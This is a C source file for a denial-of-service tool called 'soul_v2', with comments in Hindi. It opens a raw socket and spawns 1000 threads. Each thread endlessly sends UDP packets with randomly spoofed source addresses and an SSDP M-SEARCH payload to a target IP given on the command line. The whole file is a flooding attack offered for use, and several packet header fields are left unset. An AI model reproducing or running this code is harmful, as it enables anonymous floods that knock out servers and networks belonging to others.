#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

// पेलोड डेटा
char *payload = "M-SEARCH * HTTP/1.1\r\nHOST: 255.255.255.255:1900\r\nST: ssdp:all\r\nMX: 3\r\n\r\n";

struct sockaddr_in target;

void *server_freezer(void *arg) {
    // 1. Raw Socket का निर्माण (IP Spoofing के लिए)
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("Raw socket failed (Requires Root)");
        pthread_exit(NULL);
    }

    char packet[4096];
    while (1) {
        memset(packet, 0, 4096);
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
        
        // 2. IP Header को रैंडम सोर्स IP से भरें
        iph->saddr = rand(); 
        iph->daddr = target.sin_addr.s_addr;
        iph->version = 4;
        iph->ihl = 5;
        iph->protocol = IPPROTO_UDP;
        
        // 3. UDP Header सेटअप
        udph->source = htons(rand() % 65535);
        udph->dest = target.sin_port;
        
        // 4. पेलोड अटैच करें
        strcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), payload);
        
        sendto(sockfd, packet, 4096, 0, (struct sockaddr *)&target, sizeof(target));
    }
}

int main(int argc, char **argv) {
    if (argc < 2) { printf("Usage: ./soul_v2 <IP>\n"); return 1; }

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(argv[1]);
    target.sin_port = htons(80);

    printf("🔥 Ultimate Power Mode Active (Raw Spoofing) 🔥\n");

    for(int i = 0; i < 1000; i++) { // 1000 थ्रेड्स
        pthread_t thread;
        pthread_create(&thread, NULL, server_freezer, NULL);
    }
    pthread_exit(NULL);
}
